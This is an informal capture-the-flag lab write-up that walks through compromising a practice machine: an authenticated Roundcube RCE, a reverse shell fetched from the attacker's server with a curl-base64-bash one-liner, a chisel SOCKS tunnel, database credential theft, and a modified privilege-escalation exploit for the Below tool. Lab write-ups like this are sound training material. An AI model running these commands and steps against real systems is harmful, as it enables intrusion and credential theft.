was very easy the second time i approached it, i failed the first time.
we start with a pair of credentials for the user tyler, nmap shows only 22 and 80
i start checking http, i get redirected to "mail.outbound.htb", so i add that and outbound.htb to my hosts file
its running an application called roundcube mail, i try to sign in with my given credentials, and it works, which allows me to take a look at the version running
![[Pasted image 20250925161159.png]]
i check for exploits online, and i find an authenticated RCE, which is perfect for my situation. i download the exploit and follow the usage 
first i try something simple like "id", and the exploit runs, but there is no output, so i assume this must be blind RCE - so i check for execution with wget or curl using a python http server 
i also try both IP and domain name as URL, and it seems to work only with a domain name.
i confirm command execution using a wget command to my python server, so i try a simple revshell command but it doesnt work even tho the script says it was successful 
![[Pasted image 20250925161623.png]]
i solve this simply by using curl and base64, i prepare a txt file with the revshell payload encoded in base64, and host it with my http python server - then i execute this command on the target 
`curl http://10.10.16.12:9000/shell.txt | base64 -d | bash` 
and i get a revshell as www-data
next, i check the roundcube config files, and extract the DB user credentials. i try to use mysql in the revshell i got, but it seems to be inside a container, without python - and the shell is not stable enough to allow mysql interactive mode (tried with rlwrap and without)
i solve this by downloading a chisel binary to the host, and connecting to a socks proxy
on my host: `./chisel server --reverse --port 9080`
on the target host in a new terminal: `./chisel client 10.10.16.12:9080 R:socks`
now i have a socks proxy running at 1080, so i can run commands using proxychains4, i just have to keep in mind for next time, specifying the host as 127.0.0.1 with -h is crucial, otherwise i get errors.
the command: `proxychains4  -f /etc/proxychains4.conf mysql -u roundcube -D roundcube -p -h 127.0.0.1 --skip-ssl-verify-server-cert`
now i have access to the DB, i check for tables, the session and users table look interesting, i check the session table, and theres a single record inside, and it contains the imap password for the user jacob
![[Pasted image 20250925163050.png]]
with this, i can check for the encryption key for imap passwords in roundcube config, and search online for the way to decrypt it.
![[Pasted image 20250925163346.png]]
![[Pasted image 20250925163412.png]]
i check the password for SSH - doesnt work
i check the password in roundcube web UI - it works
jacob's account has 2 mails in his inbox, and they contain crucial information
in 1 is his ssh password, in another 1 is new permissions set on his account
![[Pasted image 20250925163557.png]]
![[Pasted image 20250925163606.png]]
after logging in with ssh, i check sudo permissions, and find that jacob's user indeed has some permissions with below
![[Pasted image 20250925163715.png]]
first thing i do is check GTFObins, as it could be a simple vector, but this binary is not on the list, i then decide to mess around with the binary arguments and functions, with nothing catching my eye, i check for known exploits regarding priv esc, and i find there is a 2025 CVE regarding Below local priv esc
i attempt the exploit a few times but it doesnt work, i try to check other Poc's but the only other PoC i can find is with a python script, and my target host doesnt have python.
i read the exploit script and see the exploit is trying to use the log file that was created specifically for my current user "jacob" but there is also another log file in that dir that is specifically for root user, also when i inspected the python POC, i noticed that he doesnt bother with the current user log file,
because the below log dir is world writeable, it tampers with the error_root.log file instead. so i attempt to modify the original script. from the original:
![[Pasted image 20250925164304.png]]
i end up with:
![[Pasted image 20250925164333.png]]
(removed the u variable, because i dont need to check current username and changed the link target to the error_root.log file)
now running the script leads to root shell instantly, and i grab both flags.
![[Pasted image 20250925164702.png]]
